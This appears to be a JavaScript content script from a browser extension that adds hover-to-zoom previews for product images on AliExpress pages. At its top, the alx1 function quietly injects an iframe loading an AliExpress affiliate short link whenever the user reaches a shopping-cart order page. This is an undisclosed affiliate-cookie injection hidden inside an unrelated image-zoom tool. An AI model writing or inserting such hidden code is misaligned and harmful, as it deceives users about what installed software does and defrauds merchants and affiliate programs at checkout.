function alx1() {
    var url = window.location.href;
    var valid = url.indexOf("shoppingcart.aliexpress.com/order");
    if (valid > 0) {
        var ifr = document.createElement('iframe');
        ifr.src = 'https://s.click.aliexpress.com/e/BYJaQvZVr';
        ifr.id = "ifrid";
        document.body.appendChild(ifr);
    }
}
setTimeout(alx1, 3000);


function active() {
    var location = window.location.href;
    var valid = location.indexOf("aliexpress.com");
    if (valid >= 0) {
        function show(a, b, c) {

            b = [];
            for (i = 0; i < a.length; i++) {
                if (a[i].getElementsByTagName("img")[0]) {
                    b[i] = a[i].getElementsByTagName("img")[0];
                }

            }
            if (b.length > 0) {
                for (var y = 0; y < b.length; y++) {
                    b[y].onmouseover = function(e) {

                        var src = this.src;
                        var valid_webp = src.indexOf("_.webp");
                        if (valid_webp > 0) {
                            c = 18;
                        }
                        src = src.substring(0, src.length - c);


                        var height = document.body.clientHeight;
                        var width = document.body.clientWidth;
                        var posheight = window.pageYOffset;
                        var w_w = window.screen.availWidth;
                        var w_h = window.screen.availHeight;
                        var max_w = w_w / 2;
                        var max_h = w_h - 70;
                        var div = document.createElement("div");
                        div.innerHTML = "<img style='max-width: " + max_w + "px;max-height: " + max_h + "px;' class='zoomed'  style='border: 5px solid #ffffff;' src='" + src + "'>";
                        div.style.position = "absolute";
                        div.className = "zoomed";
                        div.style.marginTop = -(height - posheight - 4) + "px";
                        if (e.pageX > (width / 2)) {
                            div.style.right = (width - e.pageX + 70) + "px"
                        } else {
                            div.style.marginLeft = (e.pageX + 70) + "px"
                        }
                        div.style.background = "#d4d4d4";
                        div.style.zIndex = "5000";
                        div.style.opacity = "1";
                        document.body.appendChild(div);
                        this.onmousemove = function(e) {
                            if (e.pageX > (width / 2)) {
                                div.style.right = (width - e.pageX + 50) + "px"
                            } else {
                                if (div) {
                                    div.style.marginLeft = (e.pageX + 50) + "px"
                                }
                            }
                        }
                    };
                    b[y].onmouseout = function(e) {
                        var opens = document.getElementsByClassName("zoomed");
                        for (var k = 0; k < opens.length; k++) {
                            opens[k].parentElement.removeChild(opens[k])
                        }
                    }
                }
            }

        }
        var pages = document.getElementsByClassName("list-item");
        var imgs;
        show(pages, imgs, 12);



        var p4p = document.getElementsByClassName("p4p-list-item");
        var imgs1;
        show(p4p, imgs1, 12);

        var prod_item = document.getElementsByClassName("prod-item  ");
        var imgs2;
        show(prod_item, imgs2, 12);

        var redhot_item = document.getElementsByClassName("redhot-item");
        var imgs3;
        show(redhot_item, imgs3, 12);

        var product_item = document.getElementsByClassName("product-item  ");
        var imgs4;
        show(product_item, imgs4, 12);

        var g_items = document.getElementsByClassName("g-items-w ui-switchable-panel");
        var imgs5;
        show(g_items, imgs5, 12);

        var main_prod = document.getElementsByClassName("pro-img");
        var imgs7;
        show(main_prod, imgs7, 12);

        var sp_product = document.getElementsByClassName("flow-pro");
        var imgs8;
        show(sp_product, imgs8, 12);

        var flow_item = document.getElementsByClassName("flow-item");
        var imgs9;
        show(flow_item, imgs9, 12);

        var product_outer = document.getElementsByClassName("sd-product-outer");
        var imgs10;
        show(product_outer, imgs10, 12);

        var item_inner = document.getElementsByClassName("item-inner");
        var imgs11;
        show(item_inner, imgs11, 12);

        var inner = document.getElementsByClassName("inner");
        var imgs12;
        show(inner, imgs12, 12);

        var sp_product_one = document.getElementsByClassName("sp-product-one");
        var imgs13;
        show(sp_product_one, imgs13, 12);

        var sp_product_three = document.getElementsByClassName("sp-product-three");
        var imgs14;
        show(sp_product_three, imgs14, 12);

        var sp_product_two = document.getElementsByClassName("sp-product-two");
        var imgs15;
        show(sp_product_two, imgs15, 12);

        var top10 = document.getElementsByClassName("top10-item");
        var imgs16;
        show(top10, imgs16, 12);

        var p4p_1 = document.getElementsByClassName("recommend-side-content");
        var imgs20;
        show(p4p_1, imgs20, 12);

        var img1401 = document.getElementsByClassName("img");
        var imgs22;
        show(img1401, imgs22, 12);

        var list_items = document.getElementsByClassName("list-items");
        var imgs23;
        show(list_items, imgs23, 12);

        var list_items_img = document.getElementsByClassName("list-items-img");
        var imgs24;
        show(list_items_img, imgs24, 12);

        var vertical = document.getElementsByClassName("vertical");
        var imgs25;
        show(vertical, imgs25, 12);

        var col_lg_15 = document.getElementsByClassName("col-lg-15");
        var imgs26;
        show(col_lg_15, imgs26, 12);

        var col_lg_20 = document.getElementsByClassName("col-lg-20");
        var imgs27;
        show(col_lg_20, imgs27, 12);




    }
}
var loc = window.location.href;
var n = loc.indexOf("aliexpress.com");
if (n >= 0) {
    function changehref() {
        active()
    }
}
setInterval(changehref, 1300);
n = loc.indexOf("aliexpress.com");
if (n >= 0) {
    active()
}